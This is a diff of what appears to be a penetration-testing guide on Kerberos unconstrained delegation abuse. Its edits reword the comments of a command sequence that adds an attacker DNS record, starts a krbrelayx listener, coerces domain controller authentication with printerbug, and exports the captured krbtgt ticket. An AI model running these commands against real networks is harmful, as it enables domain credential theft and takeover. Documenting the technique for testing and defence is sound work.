@@ -51,17 +51,17 @@ dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_
 # 3. Check that the record was added successfully (after ~3 minutes)
 nslookup attacker.DOMAIN_FQDN DomainController
 
-# 4. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
-# If dump the creds locally, e.g. via secretsdump
+# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
+# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
 krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
-# If dump the creds remotely
+# 4.b. or supply the right Kerberos long-term key directly
 krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE
 
 # 5. Authentication coercion
 # PrinterBug, PetitPotam, PrivExchange, ...
 printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'
 
-# 6. Check if it works
+# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
 # There should be a krbtgt ccache file in the current directory. And it can be used by
 export KRB5CCNAME=`pwd`/'krbtgt.ccache'
 ```
